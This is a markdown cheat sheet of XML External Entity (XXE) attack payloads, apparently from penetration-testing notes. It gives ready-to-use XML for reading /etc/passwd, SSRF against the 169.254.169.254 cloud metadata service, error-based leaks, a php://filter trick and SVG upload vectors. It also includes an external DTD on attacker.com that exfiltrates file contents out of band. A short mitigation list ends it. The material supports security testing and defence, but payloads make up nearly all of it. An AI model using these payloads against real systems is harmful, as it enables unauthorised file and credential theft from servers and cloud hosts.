---
title: XML External Entity (XXE)
excerpt: XXE attack patterns — basic, blind OOB exfil, error-based, and SVG/XLSX vectors.
---

# XML External Entity (XXE)

## Basic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

---

## SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

---

## Blind XXE — OOB via DTD

When the response doesn't reflect the entity, use an out-of-band channel.

**External DTD** (hosted on attacker server at `http://attacker.com/evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
%send;
```

**Payload in the request:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>x</foo>
```

---

## Error-based XXE

If the app reflects XML parsing errors:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %wrap;
  %err;
]>
```

The file content appears in the error message.

---

## PHP filter — base64 encode to bypass newline issues

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

---

## Common attack vectors

| Input | Vector |
|---|---|
| XML request body | Classic XXE |
| File upload (SVG) | `<svg>` with XML declaration |
| File upload (XLSX/DOCX) | ZIP → XML files inside |
| SOAP API | XML SOAP body |
| RSS/Atom feed parsing | External entity in feed |

**SVG example:**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## Mitigation

- Disable external entities in the XML parser (default in most modern parsers if configured)
- Use `defusedxml` in Python, `FEATURE_DISALLOW_DOCTYPE_DECL` in Java
- Input validation on file uploads (check magic bytes, not just extension)
